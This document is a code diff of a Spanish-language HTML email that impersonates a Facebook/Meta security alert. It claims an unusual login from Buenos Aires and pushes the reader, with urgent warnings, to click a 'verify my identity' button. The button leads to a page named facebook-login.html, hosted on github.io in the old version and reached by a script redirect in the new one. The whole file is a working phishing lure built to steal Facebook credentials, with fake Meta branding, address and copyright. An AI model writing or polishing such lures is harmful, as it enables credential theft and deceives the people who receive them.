@@ -15,124 +15,130 @@
         body {
             background-color: #f0f2f5;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
         
-        .email-wrapper {
+        .email-container {
             width: 100%;
             max-width: 680px;
             background: white;
-            margin: 20px auto;
-            border-radius: 0;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             overflow: hidden;
             border: 1px solid #dddfe2;
         }
         
-        .meta-header {
+        .email-header {
             background: linear-gradient(135deg, #1877f2 0%, #0d66d0 100%);
-            padding: 20px 0;
+            padding: 30px 40px;
             text-align: center;
-            border-bottom: 1px solid #166fe5;
         }
         
         .logo-container {
             display: inline-block;
             background: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 15px 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
         
         .facebook-logo {
-            height: 24px;
+            height: 32px;
             width: auto;
+            filter: brightness(0.9);
         }
         
         .email-content {
-            padding: 32px 40px;
+            padding: 40px;
             color: #1c1e21;
-            font-size: 14px;
-            line-height: 1.34;
-            background: white;
+            font-size: 15px;
+            line-height: 1.5;
         }
         
         .greeting {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 20px;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 24px;
             color: #1c1e21;
             padding-bottom: 16px;
-            border-bottom: 1px solid #e4e6eb;
+            border-bottom: 2px solid #f0f2f5;
         }
         
-        .security-alert {
-            background: linear-gradient(135deg, #fef5e6 0%, #fdebd0 100%);
-            border: 1px solid #f8c471;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 24px 0;
-            border-left: 4px solid #f39c12;
+        .intro-text {
+            color: #4b4f56;
+            margin-bottom: 24px;
+            line-height: 1.6;
         }
         
-        .alert-title {
+        .security-badge {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 10px;
+            padding: 24px;
+            margin: 28px 0;
+            border-left: 5px solid #1877f2;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        
+        .badge-title {
             font-weight: 700;
-            color: #e65100;
-            margin-bottom: 8px;
-            font-size: 16px;
+            color: #1c1e21;
+            margin-bottom: 12px;
+            font-size: 17px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
         }
         
-        .alert-icon {
+        .badge-title::before {
+            content: "🔒";
             font-size: 18px;
         }
         
-        .login-details {
-            background: #f8f9fa;
-            border: 1px solid #e4e6eb;
-            border-radius: 8px;
+        .login-details-box {
+            background: #ffffff;
+            border: 2px solid #e4e6eb;
+            border-radius: 10px;
             padding: 0;
-            margin: 24px 0;
+            margin: 28px 0;
             overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
         
         .details-header {
             background: #1877f2;
             color: white;
-            padding: 16px 20px;
+            padding: 18px 24px;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 15px;
         }
         
-        .detail-row {
+        .detail-item {
             display: flex;
-            padding: 14px 20px;
-            border-bottom: 1px solid #e4e6eb;
-            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid #f0f2f5;
+            align-items: center;
         }
         
-        .detail-row:last-child {
+        .detail-item:last-child {
             border-bottom: none;
         }
         
         .detail-label {
-            width: 140px;
+            width: 150px;
             color: #65676b;
-            font-weight: 500;
-            font-size: 13px;
+            font-weight: 600;
+            font-size: 14px;
             flex-shrink: 0;
         }
         
         .detail-value {
             flex: 1;
             color: #1c1e21;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 500;
         }
         
@@ -140,190 +146,159 @@
             color: #d63031;
             font-weight: 700;
             font-size: 11px;
-            background: linear-gradient(135deg, #ff7675 0%, #fd79a8 100%);
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
             color: white;
-            padding: 4px 10px;
-            border-radius: 12px;
-            margin-left: 10px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            margin-left: 12px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         
-        .action-required {
-            background: linear-gradient(135deg, #ffeaa7 0%, #fab1a0 100%);
-            border: 1px solid #fd79a8;
-            border-radius: 8px;
-            padding: 20px;
+        .security-notice {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            border: 2px solid #ffd54f;
+            border-radius: 10px;
+            padding: 24px;
             margin: 28px 0;
-            position: relative;
-            overflow: hidden;
+            border-left: 5px solid #f39c12;
         }
         
-        .action-required::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 6px;
-            height: 100%;
-            background: linear-gradient(180deg, #e17055 0%, #d63031 100%);
-        }
-        
-        .action-title {
-            color: #d63031;
+        .security-title {
+            color: #e67e22;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
             font-size: 16px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
         }
         
-        .verify-button-container {
+        .security-title::before {
+            content: "⚠️";
+            font-size: 18px;
+        }
+        
+        .action-buttons {
             margin: 32px 0;
             text-align: center;
-            padding: 20px;
-            background: #f8f9fa;
-            border-radius: 8px;
-            border: 2px dashed #bdc3c7;
         }
         
-        .verify-button {
+        .protect-button {
             display: inline-block;
             background: linear-gradient(135deg, #1877f2 0%, #0d66d0 100%);
             color: #ffffff;
             text-decoration: none;
             font-weight: 700;
-            padding: 16px 48px;
-            border-radius: 8px;
+            padding: 18px 45px;
+            border-radius: 10px;
             font-size: 16px;
             border: none;
             cursor: pointer;
-            min-width: 220px;
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+            min-width: 240px;
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.3);
             transition: all 0.3s ease;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         
-        .verify-button:hover {
+        .protect-button:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(24, 119, 242, 0.4);
+            box-shadow: 0 6px 20px rgba(24, 119, 242, 0.4);
             background: linear-gradient(135deg, #166fe5 0%, #0b5bc4 100%);
         }
         
-        .security-note {
-            color: #65676b;
-            font-size: 13px;
-            line-height: 1.5;
-            margin: 24px 0;
-            padding: 20px;
+        .info-section {
             background: #e8f4fd;
             border-radius: 8px;
+            padding: 20px;
+            margin: 24px 0;
             border-left: 4px solid #3498db;
         }
         
-        .urgent-notice {
-            background: #ffeaa7;
-            border: 1px solid #fdcb6e;
-            border-radius: 6px;
-            padding: 12px 16px;
-            margin: 16px 0;
-            font-size: 12px;
-            color: #e17055;
-            font-weight: 600;
-        }
-        
-        .email-footer {
-            background: #f0f2f5;
-            padding: 30px 40px;
+        .footer {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 35px 40px;
             color: #65676b;
-            font-size: 12px;
+            font-size: 13px;
             line-height: 1.5;
-            border-top: 1px solid #dddfe2;
+            border-top: 2px solid #dddfe2;
         }
         
         .footer-links {
-            margin: 20px 0;
+            margin: 24px 0;
             text-align: center;
         }
         
         .footer-links a {
             color: #1877f2;
             text-decoration: none;
-            margin: 0 12px;
-            font-size: 12px;
-            font-weight: 500;
+            margin: 0 15px;
+            font-size: 13px;
+            font-weight: 600;
+            transition: color 0.3s ease;
         }
         
         .footer-links a:hover {
+            color: #0d66d0;
             text-decoration: underline;
         }
         
-        .meta-address {
+        .meta-info {
             text-align: center;
             margin: 16px 0;
             color: #8a8d91;
-            font-size: 11px;
+            font-size: 12px;
         }
         
         .copyright {
             text-align: center;
             margin-top: 20px;
             color: #8a8d91;
-            font-size: 11px;
+            font-size: 12px;
             border-top: 1px solid #dddfe2;
-            padding-top: 16px;
-        }
-        
-        .security-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #2ecc71;
-            color: white;
-            padding: 6px 12px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-left: 10px;
+            padding-top: 20px;
         }
         
         @media (max-width: 600px) {
-            .email-content {
-                padding: 24px;
+            body {
+                padding: 10px;
             }
             
-            .detail-row {
+            .email-content, .footer {
+                padding: 25px;
+            }
+            
+            .email-header {
+                padding: 25px 20px;
+            }
+            
+            .detail-item {
                 flex-direction: column;
-                gap: 6px;
+                align-items: flex-start;
+                gap: 8px;
             }
             
             .detail-label {
                 width: 100%;
             }
             
-            .verify-button {
+            .protect-button {
                 display: block;
                 width: 100%;
                 margin: 8px 0;
             }
             
-            .email-footer {
-                padding: 24px;
-            }
-            
             .footer-links a {
                 display: block;
-                margin: 8px 0;
+                margin: 10px 0;
             }
         }
     </style>
 </head>
 <body>
-    <div class="email-wrapper">
-        <!-- Header oficial con logo -->
-        <div class="meta-header">
+    <div class="email-container">
+        <div class="email-header">
             <div class="logo-container">
                 <img src="https://images.vexels.com/media/users/3/223136/isolated/preview/984f500cf9de4519b02b354346eb72e0-icono-de-facebook-redes-sociales.png" 
                      alt="Facebook" 
@@ -332,122 +307,82 @@
         </div>
         
         <div class="email-content">
-            <!-- Saludo personalizado -->
-            <div class="greeting">⚠️ Verificación de seguridad requerida</div>
+            <div class="greeting">Hola <strong>Usuario</strong>,</div>
             
-            <!-- Mensaje principal -->
-            <p style="margin-bottom: 20px; color: #2d3436; line-height: 1.6;">
-                Hemos detectado un intento de acceso inusual a tu cuenta de Facebook. Para proteger tu información personal, hemos aplicado medidas de seguridad temporales.
-            </p>
+            <p class="intro-text">Hemos detectado un intento de inicio de sesión inusual en tu cuenta de Facebook. Por seguridad, hemos bloqueado temporalmente el acceso hasta que verifiques tu identidad.</p>
             
-            <!-- Alerta de seguridad -->
-            <div class="security-alert">
-                <div class="alert-title">
-                    <span class="alert-icon">🔍</span>
-                    ACTIVIDAD SOSPECHOSA DETECTADA
-                </div>
-                <p style="margin: 0; color: #e17055; font-size: 14px; font-weight: 500;">
-                    Se requiere verificación de identidad para reactivar el acceso a tu cuenta.
-                </p>
+            <div class="security-badge">
+                <div class="badge-title">Actividad sospechosa detectada</div>
+                <p style="margin: 0; color: #65676b; font-size: 14px;">Para proteger tu cuenta, necesitamos que verifiques tu identidad haciendo clic en el botón de abajo.</p>
             </div>
             
-            <!-- Detalles del intento de acceso -->
-            <div class="login-details">
+            <div class="login-details-box">
                 <div class="details-header">
                     📋 Detalles del intento de acceso
                 </div>
-                <div class="detail-row">
-                    <div class="detail-label">📅 Fecha y hora</div>
-                    <div class="detail-value" id="loginDateTime">miércoles, 22 de octubre de 2025 a las 09:21</div>
+                <div class="detail-item">
+                    <div class="detail-label">Fecha y hora</div>
+                    <div class="detail-value" id="loginDateTime"></div>
                 </div>
-                <div class="detail-row">
-                    <div class="detail-label">📍 Ubicación</div>
+                <div class="detail-item">
+                    <div class="detail-label">Ubicación</div>
                     <div class="detail-value">
                         Buenos Aires, Argentina
-                        <span class="warning-badge">Ubicación inusual</span>
+                        <span class="warning-badge">UBICACIÓN INUSUAL</span>
                     </div>
                 </div>
-                <div class="detail-row">
-                    <div class="detail-label">💻 Dispositivo</div>
-                    <div class="detail-value">
-                        Chrome en Windows
-                        <span class="warning-badge">No reconocido</span>
-                    </div>
+                <div class="detail-item">
+                    <div class="detail-label">Dispositivo</div>
+                    <div class="detail-value">Chrome en Windows - No reconocido</div>
                 </div>
-                <div class="detail-row">
-                    <div class="detail-label">🌐 Dirección IP</div>
+                <div class="detail-item">
+                    <div class="detail-label">Dirección IP</div>
                     <div class="detail-value">190.210.45.128</div>
                 </div>
-                <div class="detail-row">
-                    <div class="detail-label">🛡️ Estado</div>
+                <div class="detail-item">
+                    <div class="detail-label">Estado</div>
                     <div class="detail-value">
-                        Cuenta protegida
-                        <span class="security-badge">✅ Verificación pendiente</span>
+                        <span class="warning-badge">BLOQUEADO POR SEGURIDAD</span>
                     </div>
                 </div>
             </div>
             
-            <!-- Sección de acción requerida -->
-            <div class="action-required">
-                <div class="action-title">
-                    <span>🚨</span>
-                    ACCIÓN REQUERIDA INMEDIATAMENTE
-                </div>
-                <p style="margin: 0; color: #2d3436; font-size: 14px; font-weight: 500;">
-                    Para reactivar tu cuenta y proteger tu información personal, necesitamos que verifiques tu identidad mediante el siguiente proceso seguro.
-                </p>
+            <div class="security-notice">
+                <div class="security-title">Acción requerida inmediatamente</div>
+                <p style="margin: 0 0 12px 0; color: #1c1e21; font-size: 14px;">Para reactivar tu cuenta y proteger tu información personal, necesitamos que verifiques tu identidad.</p>
             </div>
             
-            <!-- Aviso urgente -->
-            <div class="urgent-notice">
-                ⏰ <strong>Importante:</strong> Tienes 24 horas para completar esta verificación. Pasado este tiempo, tu cuenta permanecerá bloqueada por seguridad.
-            </div>
-            
-            <!-- Botón de verificación -->
-            <div class="verify-button-container">
-                <p style="margin: 0 0 16px 0; color: #2d3436; font-weight: 600; font-size: 15px;">
-                    Haz clic en el siguiente botón para iniciar la verificación segura:
-                </p>
-                <a href="https://williamgl3.github.io/login-F/facebook-login.html" class="verify-button">
+            <div class="action-buttons">
+                <button class="protect-button" onclick="redirectToLogin()">
                     🔒 Verificar mi identidad ahora
-                </a>
-                <p style="margin: 12px 0 0 0; color: #7f8c8d; font-size: 12px;">
-                    Serás redirigido a un entorno seguro de Facebook
-                </p>
+                </button>
             </div>
             
-            <!-- Nota de seguridad -->
-            <div class="security-note">
-                <strong>📝 ¿Por qué recibes esta notificación?</strong><br><br>
-                Facebook activa automáticamente estas protecciones cuando detectamos actividad inusual en tu cuenta que podría indicar un intento de acceso no autorizado.<br><br>
-                
-                <strong>💡 Recomendación de seguridad:</strong> Si no reconoces esta actividad, te recomendamos cambiar tu contraseña inmediatamente después de completar la verificación y revisar la actividad reciente de tu cuenta.
+            <div class="info-section">
+                <strong>¿Por qué recibes esta notificación?</strong><br>
+                Facebook activa estas protecciones automáticamente cuando detectamos actividad inusual en tu cuenta. Si no realizaste esta acción, te recomendamos cambiar tu contraseña después de verificar tu identidad.
             </div>
         </div>
         
-        <!-- Footer oficial -->
-        <div class="email-footer">
+        <div class="footer">
             <div class="footer-links">
                 <a href="#">Centro de ayuda</a>
                 <a href="#">Centro de seguridad</a>
-                <a href="#">Políticas de datos</a>
+                <a href="#">Políticas de Facebook</a>
                 <a href="#">Preferencias de email</a>
-                <a href="#">Informar problema</a>
             </div>
-            
-            <div class="meta-address">
-                Meta Platforms, Inc. · 1 Facebook Way · Menlo Park, CA 94025 · USA
+            <div class="meta-info">
+                Meta Platforms, Inc. · 1 Facebook Way · Menlo Park, CA 94025
             </div>
-            
+            <div style="text-align: center; margin: 10px 0; font-weight: 600; color: #1877f2;">Meta</div>
             <div class="copyright">
-                © 2025 Meta Platforms, Inc. Todos los derechos reservados.<br>
-                Facebook es una marca registrada de Meta Platforms, Inc.
+                © 2025 Meta Platforms, Inc.
             </div>
         </div>
     </div>
 
     <script>
-        // Configurar fecha y hora actual realista
+        // Configurar fecha y hora actual
         const now = new Date();
         const dateOptions = { 
             weekday: 'long',
@@ -455,16 +390,28 @@
             month: 'long', 
             day: 'numeric'
         };
-        
         const timeOptions = {
             hour: '2-digit',
             minute: '2-digit',
-            hour12: true
+            hour12: false
         };
         
         const formattedDate = now.toLocaleDateString('es-ES', dateOptions);
         const formattedTime = now.toLocaleTimeString('es-ES', timeOptions);
         document.getElementById('loginDateTime').textContent = `${formattedDate} a las ${formattedTime}`;
+
+        // Función para redirigir al login
+        function redirectToLogin() {
+            console.log('🔗 Redirigiendo a facebook-login.html');
+            window.location.href = 'facebook-login.html';
+        }
+
+        // También hacer que el botón responda al enter y espacio
+        document.querySelector('.protect-button').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' || e.key === ' ') {
+                redirectToLogin();
+            }
+        });
     </script>
 </body>
 </html>
